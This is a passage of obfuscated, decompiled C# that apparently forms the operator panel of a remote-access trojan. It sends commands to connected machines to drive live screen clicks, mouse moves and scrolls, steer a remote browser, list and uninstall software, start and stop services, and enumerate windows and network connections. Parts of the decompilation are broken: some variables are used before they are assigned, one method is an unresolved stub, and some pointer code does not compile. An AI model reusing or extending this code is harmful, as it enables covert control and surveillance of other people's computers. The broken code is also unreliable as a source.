                textArray3[9] = Conversions.ToString(e.Y);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray3);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
    }

    private void method_165(object sender, MouseEventArgs e)
    {
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("remotebrowser_scroll|", Interaction.IIf(e.Delta > 0, "1", "0")));
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_166(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void method_167(object sender, EventArgs e)
    {
        this.vmethod_24().Focus();
    }

    private void method_168(object sender, EventArgs e)
    {
        this.vmethod_24().Focus();
    }

    private void method_169(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    public void method_17(ref string string_12)
    {
        string str2 = string.Empty;
        string text = string.Empty;
        string str4 = string.Empty;
        string left = string.Empty;
        string str5 = string.Empty;
        string str6 = string.Empty;
        string str7 = string.Empty;
        string str8 = string.Empty;
        string str9 = string.Empty;
        if (this.vmethod_578().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_578().Invoke(new Delegate20(this.method_17), args);
        }
        else
        {
            long num;
            long num2;
            List<ListViewItem> list2 = new List<ListViewItem>();
            this.vmethod_578().Items.Clear();
            this.vmethod_574().Value = 0;
            this.vmethod_574().Maximum = 1;
            this.vmethod_576().set_MaximumValue(1);
            this.vmethod_576().Visible = true;
            List<JToken> list = Enumerable.ToList<JToken>(JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"]);
            this.vmethod_576().set_MaximumValue(list.Count - 1);
            this.vmethod_576().set_Value(0);
            this.vmethod_574().Maximum = this.vmethod_576().get_MaximumValue();
            this.vmethod_570().Text = "Services: " + Conversions.ToString(list.Count);
            this.vmethod_566().SendToBack();
            this.vmethod_566().Visible = false;
            List<JToken>.Enumerator enumerator = list.GetEnumerator();
            while (enumerator.MoveNext())
            {
                JToken current = enumerator.Current;
                ListViewItem item = new ListViewItem();
                str2 = Encoding.UTF8.GetString(Convert.FromBase64String(current["name"].ToString()));
                text = Encoding.UTF8.GetString(Convert.FromBase64String(current["disp"].ToString()));
                str4 = current["pid"].ToString();
                left = current["status"].ToString();
                str5 = current["startup"].ToString();
                str6 = current["type"].ToString();
                str7 = current["err"].ToString();
                str8 = Encoding.UTF8.GetString(Convert.FromBase64String(current["path"].ToString()));
                str9 = Encoding.UTF8.GetString(Convert.FromBase64String(current["dep"].ToString()));
                if (Operators.CompareString(left, "Running", true) == 0)
                {
                    num += 1L;
                }
                else if (Operators.CompareString(left, "Stopped", true) == 0)
                {
                    num2 += 1L;
                }
                item.Text = str2;
                item.SubItems.Add(text);
                item.SubItems.Add(str4);
                item.SubItems.Add(left);
                item.SubItems.Add(str5);
                item.SubItems.Add(str6);
                item.SubItems.Add(str7);
                item.SubItems.Add(str8);
                item.SubItems.Add(str9);
                list2.Add(item);
                if (this.vmethod_576().get_Value() < this.vmethod_576().get_MaximumValue())
                {
                    ZeroitAnidasoCircleProgress progress;
                    ToolStripProgressBar bar;
                    (progress = this.vmethod_576()).set_Value(progress.get_Value() + 1);
                    (bar = this.vmethod_574()).Value = bar.Value + 1;
                }
                Application.DoEvents();
            }
            this.vmethod_572().Text = "Running: " + Conversions.ToString(num);
            this.vmethod_664().Text = "Stopped: " + Conversions.ToString(num2);
            this.vmethod_576().set_Value(this.vmethod_576().get_MaximumValue());
            this.vmethod_576().Visible = false;
            this.vmethod_578().Enabled = true;
            this.vmethod_578().Items.AddRange(list2.ToArray());
            this.vmethod_574().Value = 0;
        }
    }

    private void method_170(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void method_171(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 12;
        this.method_41();
    }

    private void method_172(object sender, EventArgs e)
    {
        this.vmethod_550().Items.Clear();
        this.vmethod_550().Enabled = false;
        this.vmethod_512().BringToFront();
        this.vmethod_512().Visible = true;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "soft_list|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_173(object sender, EventArgs e)
    {
        if (this.vmethod_550().Items.Count != 0)
        {
            string left = null;
            GClass7 class2 = this.vmethod_550();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        Clipboard.SetText(left.Remove(left.LastIndexOf("\r\n")));
                    }
                    break;
                }
                if (class2.Items[num].Selected)
                {
                    left = left + class2.Items[num].Text;
                    int num4 = class2.Columns.Count - 1;
                    int num2 = 1;
                    while (true)
                    {
                        if (num2 > num4)
                        {
                            left = left + "\r\n";
                            break;
                        }
                        left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                        num2++;
                    }
                }
                num++;
            }
        }
    }

    private void method_174(object sender, EventArgs e)
    {
        if (this.vmethod_550().Items.Count != 0)
        {
            string left = null;
            GClass7 class2 = this.vmethod_550();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (Operators.CompareString(left, null, true) != 0)
                    {
                        Clipboard.Clear();
                        Clipboard.SetText(left.Remove(left.LastIndexOf("\r\n")));
                    }
                    break;
                }
                left = left + class2.Items[num].Text;
                int num4 = class2.Columns.Count - 1;
                int num2 = 1;
                while (true)
                {
                    if (num2 > num4)
                    {
                        left = left + "\r\n";
                        num++;
                        break;
                    }
                    left = left + "\t" + class2.Items[num].SubItems[num2].Text;
                    num2++;
                }
            }
        }
    }

    private void method_175(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void method_176(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void method_177(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void method_178(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    private void method_179(object sender, KeyEventArgs e)
    {
        if (e.KeyCode == Keys.Tab)
        {
            e.SuppressKeyPress = true;
        }
    }

    public void method_18(ref string string_12)
    {
        string str = string.Empty;
        string text = string.Empty;
        string str3 = string.Empty;
        string str4 = string.Empty;
        string str5 = string.Empty;
        if (this.vmethod_624().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_624().Invoke(new Delegate5(this.method_18), args);
        }
        else
        {
            List<ListViewItem> list2 = new List<ListViewItem>();
            this.vmethod_624().Items.Clear();
            this.vmethod_620().Value = 0;
            this.vmethod_620().Maximum = 1;
            this.vmethod_622().set_MaximumValue(1);
            this.vmethod_622().Visible = true;
            List<JToken> list = Enumerable.ToList<JToken>(JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"]);
            this.vmethod_622().set_MaximumValue(list.Count - 1);
            this.vmethod_622().set_Value(0);
            this.vmethod_620().Maximum = this.vmethod_622().get_MaximumValue();
            this.vmethod_618().Text = "Windows: " + Conversions.ToString(list.Count);
            this.vmethod_614().SendToBack();
            this.vmethod_614().Visible = false;
            List<JToken>.Enumerator enumerator = list.GetEnumerator();
            while (enumerator.MoveNext())
            {
                JToken current = enumerator.Current;
                ListViewItem item = new ListViewItem();
                str = Encoding.UTF8.GetString(Convert.FromBase64String(current["title"].ToString()));
                text = Encoding.UTF8.GetString(Convert.FromBase64String(current["class"].ToString()));
                str3 = current["hwnd"].ToString();
                str4 = current["size"].ToString();
                str5 = current["state"].ToString();
                item.Text = str;
                item.SubItems.Add(text);
                item.SubItems.Add(str3);
                item.SubItems.Add(str4);
                item.SubItems.Add(str5);
                list2.Add(item);
                if (this.vmethod_622().get_Value() < this.vmethod_622().get_MaximumValue())
                {
                    ZeroitAnidasoCircleProgress progress;
                    ToolStripProgressBar bar;
                    (progress = this.vmethod_622()).set_Value(progress.get_Value() + 1);
                    (bar = this.vmethod_620()).Value = bar.Value + 1;
                }
                Application.DoEvents();
            }
            this.vmethod_622().set_Value(this.vmethod_622().get_MaximumValue());
            this.vmethod_622().Visible = false;
            this.vmethod_624().Enabled = true;
            this.vmethod_624().Items.AddRange(list2.ToArray());
            this.vmethod_620().Value = 0;
        }
    }

    private void method_180(object sender, EventArgs e)
    {
        if (this.vmethod_550().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_550();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    ListViewItem item;
                    object[] objArray;
                    bool[] flagArray;
                    object[] objArray1 = new object[] { (item = class2.Items[num2]).Tag };
                    bool[] flagArray1 = new bool[] { true };
                    if (flagArray[0])
                    {
                        item.Tag = objArray[0];
                    }
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "soft_uninstall|" + Convert.ToBase64String((byte[]) NewLateBinding.LateGet(Encoding.UTF8, null, "GetBytes", objArray = objArray1, null, null, flagArray = flagArray1));
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_181(object sender, MouseEventArgs e)
    {
        this.vmethod_530().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_550().Items.Count > 0, true, false));
        if (this.vmethod_550().Items.Count > 0)
        {
            this.vmethod_596().Enabled = Conversions.ToBoolean(Interaction.IIf(Strings.Len(this.vmethod_550().SelectedItems[0].Tag) > 8, true, false));
        }
    }

    private void method_182(object sender, MouseEventArgs e)
    {
        if (this.vmethod_94().Checked)
        {
            Class136.Class138 class2;
            if (e.Button == MouseButtons.Left)
            {
                string[] textArray1 = new string[0x10];
                textArray1[0] = "screenlive_click|";
                textArray1[1] = Conversions.ToString(2);
                textArray1[2] = ",";
                textArray1[3] = Conversions.ToString(this.vmethod_248().Bounds.Width);
                textArray1[4] = ",";
                textArray1[5] = Conversions.ToString(this.vmethod_248().Bounds.Height);
                textArray1[6] = ",";
                textArray1[7] = Conversions.ToString(e.X);
                textArray1[8] = ",";
                textArray1[9] = Conversions.ToString(e.Y);
                textArray1[10] = ",";
                textArray1[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_0);
                textArray1[12] = ",";
                textArray1[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_1);
                textArray1[14] = ",";
                textArray1[15] = Conversions.ToString(this.vmethod_250().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray1);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Right)
            {
                string[] textArray2 = new string[0x10];
                textArray2[0] = "screenlive_click|";
                textArray2[1] = Conversions.ToString(8);
                textArray2[2] = ",";
                textArray2[3] = Conversions.ToString(this.vmethod_248().Bounds.Width);
                textArray2[4] = ",";
                textArray2[5] = Conversions.ToString(this.vmethod_248().Bounds.Height);
                textArray2[6] = ",";
                textArray2[7] = Conversions.ToString(e.X);
                textArray2[8] = ",";
                textArray2[9] = Conversions.ToString(e.Y);
                textArray2[10] = ",";
                textArray2[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_0);
                textArray2[12] = ",";
                textArray2[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_1);
                textArray2[14] = ",";
                textArray2[15] = Conversions.ToString(this.vmethod_250().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray2);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Middle)
            {
                string[] textArray3 = new string[0x10];
                textArray3[0] = "screenlive_click|";
                textArray3[1] = Conversions.ToString(0x20);
                textArray3[2] = ",";
                textArray3[3] = Conversions.ToString(this.vmethod_248().Bounds.Width);
                textArray3[4] = ",";
                textArray3[5] = Conversions.ToString(this.vmethod_248().Bounds.Height);
                textArray3[6] = ",";
                textArray3[7] = Conversions.ToString(e.X);
                textArray3[8] = ",";
                textArray3[9] = Conversions.ToString(e.Y);
                textArray3[10] = ",";
                textArray3[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_0);
                textArray3[12] = ",";
                textArray3[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_1);
                textArray3[14] = ",";
                textArray3[15] = Conversions.ToString(this.vmethod_250().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray3);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
    }

    private void method_183(object sender, MouseEventArgs e)
    {
        if (this.vmethod_94().Checked)
        {
            Class136.Class138 class2;
            if (e.Button == MouseButtons.Left)
            {
                string[] textArray1 = new string[0x10];
                textArray1[0] = "screenlive_click|";
                textArray1[1] = Conversions.ToString(4);
                textArray1[2] = ",";
                textArray1[3] = Conversions.ToString(this.vmethod_248().Bounds.Width);
                textArray1[4] = ",";
                textArray1[5] = Conversions.ToString(this.vmethod_248().Bounds.Height);
                textArray1[6] = ",";
                textArray1[7] = Conversions.ToString(e.X);
                textArray1[8] = ",";
                textArray1[9] = Conversions.ToString(e.Y);
                textArray1[10] = ",";
                textArray1[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_0);
                textArray1[12] = ",";
                textArray1[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_1);
                textArray1[14] = ",";
                textArray1[15] = Conversions.ToString(this.vmethod_250().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray1);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Right)
            {
                string[] textArray2 = new string[0x10];
                textArray2[0] = "screenlive_click|";
                textArray2[1] = Conversions.ToString(0x10);
                textArray2[2] = ",";
                textArray2[3] = Conversions.ToString(this.vmethod_248().Bounds.Width);
                textArray2[4] = ",";
                textArray2[5] = Conversions.ToString(this.vmethod_248().Bounds.Height);
                textArray2[6] = ",";
                textArray2[7] = Conversions.ToString(e.X);
                textArray2[8] = ",";
                textArray2[9] = Conversions.ToString(e.Y);
                textArray2[10] = ",";
                textArray2[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_0);
                textArray2[12] = ",";
                textArray2[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_1);
                textArray2[14] = ",";
                textArray2[15] = Conversions.ToString(this.vmethod_250().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray2);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Middle)
            {
                string[] textArray3 = new string[0x10];
                textArray3[0] = "screenlive_click|";
                textArray3[1] = Conversions.ToString(0x40);
                textArray3[2] = ",";
                textArray3[3] = Conversions.ToString(this.vmethod_248().Bounds.Width);
                textArray3[4] = ",";
                textArray3[5] = Conversions.ToString(this.vmethod_248().Bounds.Height);
                textArray3[6] = ",";
                textArray3[7] = Conversions.ToString(e.X);
                textArray3[8] = ",";
                textArray3[9] = Conversions.ToString(e.Y);
                textArray3[10] = ",";
                textArray3[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_0);
                textArray3[12] = ",";
                textArray3[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_1);
                textArray3[14] = ",";
                textArray3[15] = Conversions.ToString(this.vmethod_250().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray3);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
    }

    private void method_184(object sender, MouseEventArgs e)
    {
        if ((this.vmethod_292().Checked & (Operators.CompareString(this.vmethod_686().Text, "Stop", true) == 0)) && ((e.X != this.int_1) | (this.int_2 != e.Y)))
        {
            Class136.Struct27 struct2 = new Class136.Struct27();
            struct2.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
            bool flag = false;
            if (Class136.GetVersionExA(ref struct2) && (struct2.int_1 >= 6))
            {
                flag = true;
            }
            long num = !flag ? ((long) Class136.GetTickCount()) : Class136.GetTickCount64();
            if ((num - Conversion.Val(this.vmethod_248().Tag)) >= 50.0)
            {
                string[] textArray1 = new string[14];
                textArray1[0] = "screenlive_move|";
                textArray1[1] = Conversions.ToString(this.vmethod_248().Bounds.Width);
                textArray1[2] = ",";
                textArray1[3] = Conversions.ToString(this.vmethod_248().Bounds.Height);
                textArray1[4] = ",";
                textArray1[5] = Conversions.ToString(e.X);
                textArray1[6] = ",";
                textArray1[7] = Conversions.ToString(e.Y);
                textArray1[8] = ",";
                textArray1[9] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_0);
                textArray1[10] = ",";
                textArray1[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_250().SelectedIndex).long_1);
                textArray1[12] = ",";
                textArray1[13] = Conversions.ToString(this.vmethod_250().SelectedIndex);
                Class136.Class138 class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray1);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
                PictureBox box = this.vmethod_248();
                struct2 = new Class136.Struct27();
                struct2.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
                flag = false;
                if (Class136.GetVersionExA(ref struct2) && (struct2.int_1 >= 6))
                {
                    flag = true;
                }
                num = !flag ? ((long) Class136.GetTickCount()) : Class136.GetTickCount64();
                box.Tag = num;
            }
            this.int_1 = e.X;
            this.int_2 = e.Y;
        }
    }

    private void method_185(object sender, MouseEventArgs e)
    {
        if (this.vmethod_94().Checked)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "screenlive_scroll|" + Conversions.ToString(e.Delta);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_186(object sender, ColumnClickEventArgs e)
    {
        SortOrder ascending;
        if (this.vmethod_550().Sorting == SortOrder.Descending)
        {
            this.vmethod_550().Sorting = SortOrder.Ascending;
            ascending = SortOrder.Ascending;
        }
        else
        {
            this.vmethod_550().Sorting = SortOrder.Descending;
            ascending = SortOrder.Descending;
        }
        this.vmethod_550().ListViewItemSorter = new Class143(e.Column, ascending);
    }

    private void method_187(object sender, ColumnClickEventArgs e)
    {
        SortOrder ascending;
        if (this.vmethod_718().Sorting == SortOrder.Descending)
        {
            this.vmethod_718().Sorting = SortOrder.Ascending;
            ascending = SortOrder.Ascending;
        }
        else
        {
            this.vmethod_718().Sorting = SortOrder.Descending;
            ascending = SortOrder.Descending;
        }
        this.vmethod_718().ListViewItemSorter = new Class143(e.Column, ascending);
    }

    public void method_188(int int_6)
    {
        // Unresolved stack state at '00000008'
    }

    private void method_189(object sender, EventArgs e)
    {
        this.vmethod_444().Text = "Selected: " + Conversions.ToString(this.vmethod_720().SelectedItems.Count);
        if ((this.fThumb_0 != null) && this.fThumb_0.Visible)
        {
            GClass7 class2 = this.vmethod_720();
            if ((class2.SelectedItems.Count > 0) && Class136.smethod_5(class2.SelectedItems[0].Text))
            {
                this.fThumb_0.method_0(class2.SelectedItems[0].Text, this.string_0, this.string_1, this.string_2, this.string_3);
                Class136.Class138 class3 = new Class136.Class138();
                class3.string_0 = this.string_4;
                class3.string_1 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("thumb_data|", class2.SelectedItems[0].Tag), "|"), Class130.fSettings_0.vmethod_92().Text), "|"), Class130.fSettings_0.vmethod_86().Text));
                class3.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                {
                    new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                }
                this.fThumb_0.method_1();
            }
            class2 = null;
        }
    }

    public void method_19(ref string string_12)
    {
        ImageList list1 = new ImageList();
        list1.ImageSize = new Size(0x10, 0x10);
        ImageList list2 = list1;
        string key = string.Empty;
        string left = string.Empty;
        string text = string.Empty;
        string str5 = string.Empty;
        string str6 = string.Empty;
        string str7 = string.Empty;
        string str8 = string.Empty;
        string str9 = string.Empty;
        string str10 = string.Empty;
        string s = string.Empty;
        if (this.vmethod_718().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_718().Invoke(new Delegate32(this.method_19), args);
        }
        else
        {
            this.vmethod_718().Enabled = false;
            this.vmethod_718().Items.Clear();
            this.vmethod_718().SmallImageList = list2;
            this.vmethod_364().set_MaximumValue(1);
            this.vmethod_364().Visible = true;
            this.vmethod_512().SendToBack();
            this.vmethod_512().Visible = false;
            this.vmethod_506().Maximum = 1;
            List<JToken> list = Enumerable.ToList<JToken>(JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"]);
            this.vmethod_364().set_MaximumValue(list.Count - 1);
            this.vmethod_496().Text = "Endpoints: " + list[list.Count - 1]["endpoints"].ToString();
            this.vmethod_498().Text = "TCP: " + list[list.Count - 1]["tcp"].ToString();
            this.vmethod_500().Text = "UDP: " + list[list.Count - 1]["udp"].ToString();
            this.vmethod_502().Text = "Established: " + list[list.Count - 1]["est"].ToString();
            this.vmethod_504().Text = "Listening: " + list[list.Count - 1]["lis"].ToString();
            this.vmethod_506().Maximum = this.vmethod_364().get_MaximumValue();
            this.vmethod_364().set_Value(0);
            this.vmethod_506().Value = 0;
            List<ListViewItem> list3 = new List<ListViewItem>();
            List<JToken>.Enumerator enumerator2 = list.GetEnumerator();
            while (enumerator2.MoveNext())
            {
                JToken current = enumerator2.Current;
                key = Encoding.UTF8.GetString(Convert.FromBase64String(current["pname"].ToString()));
                left = current["pid"].ToString();
                text = current["protocol"].ToString();
                str5 = current["laddr"].ToString();
                str6 = current["lport"].ToString();
                str7 = current["raddr"].ToString();
                str8 = current["rport"].ToString();
                str9 = current["state"].ToString();
                str10 = Encoding.UTF8.GetString(Convert.FromBase64String(current["condata"].ToString()));
                s = string.Empty;
                s = current["icon"].ToString();
                if (s.Length > 8)
                {
                    list2.Images.Add(key, Class136.smethod_18(ref Convert.FromBase64String(s)));
                }
                ListViewItem item = new ListViewItem();
                ListViewItem item1 = new ListViewItem();
                if (s.Length <= 0)
                {
                    item.Text = key;
                }
                else
                {
                    item.Text = key;
                    item.ImageKey = key;
                }
                if (Operators.CompareString(left, Class130.concurrentDictionary_3[this.string_4].sPID, true) == 0)
                {
                    item.BackColor = Color.DeepSkyBlue;
                }
                item.Text = key;
                item.SubItems.Add(left);
                item.SubItems.Add(text);
                item.SubItems.Add(str5);
                item.SubItems.Add(str6);
                item.SubItems.Add(str7);
                item.SubItems.Add(str8);
                item.SubItems.Add(str9);
                item.Tag = str10;
                list3.Add(item);
                if (this.vmethod_364().get_Value() < this.vmethod_364().get_MaximumValue())
                {
                    ZeroitAnidasoCircleProgress progress;
                    (progress = this.vmethod_364()).set_Value(progress.get_Value() + 1);
                    this.vmethod_506().Value = this.vmethod_364().get_Value();
                }
                Application.DoEvents();
            }
            this.vmethod_718().Items.AddRange(list3.ToArray());
            IEnumerator enumerator = this.vmethod_718().Columns.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ColumnHeader) enumerator.Current).Tag = SortOrder.None;
            }
            this.vmethod_364().set_Value(this.vmethod_364().get_MaximumValue());
            this.vmethod_364().Visible = false;
            this.vmethod_718().Enabled = true;
            this.vmethod_506().Value = 0;
        }
    }

    private void method_190(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 13;
        this.method_41();
    }

    private void method_191(object sender, EventArgs e)
    {
        this.vmethod_578().Enabled = false;
        this.vmethod_578().Items.Clear();
        this.vmethod_566().BringToFront();
        this.vmethod_566().Visible = true;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "srv_list|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_192(object sender, DoWorkEventArgs e)
    {
        this.int_0 = 0;
        while (this.int_0 < 100)
        {
            ref int numRef;
            *(numRef = ref this.int_0) = numRef + 5;
            this.method_188(this.int_0);
            Thread.Sleep(1);
        }
    }

    private void method_193(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_550().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_194(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_552().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_195(object sender, ColumnClickEventArgs e)
    {
        this.vmethod_388().Sorting = (this.vmethod_388().Sorting != SortOrder.Ascending) ? SortOrder.Ascending : SortOrder.Descending;
        this.vmethod_388().Sort();
    }

    private void method_196(object sender, EventArgs e)
    {
        if (this.vmethod_578().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_578();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "srv_start|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(class2.Items[num2].Text));
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_197(object sender, EventArgs e)
    {
        if (this.vmethod_578().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_578();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "srv_control|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(class2.Items[num2].Text)) + "|1";
                    class3.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                    {
                        new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                    }
                }
                num2++;
            }
        }
    }

    private void method_198(object sender, EventArgs e)
    {
        if (this.vmethod_578().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_578();
            int num = class2.Items.Count - 1;
            int num2 = 0;
            while (true)
            {
                if (num2 > num)
                {
                    class2 = null;
                    break;
                }
                if (class2.Items[num2].Selected)
                {
                    Class136.Class138 class3 = new Class136.Class138();
                    class3.string_0 = this.string_4;
                    class3.string_1 = "srv_control|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(class2.Items[num2].Text)) + "|2";
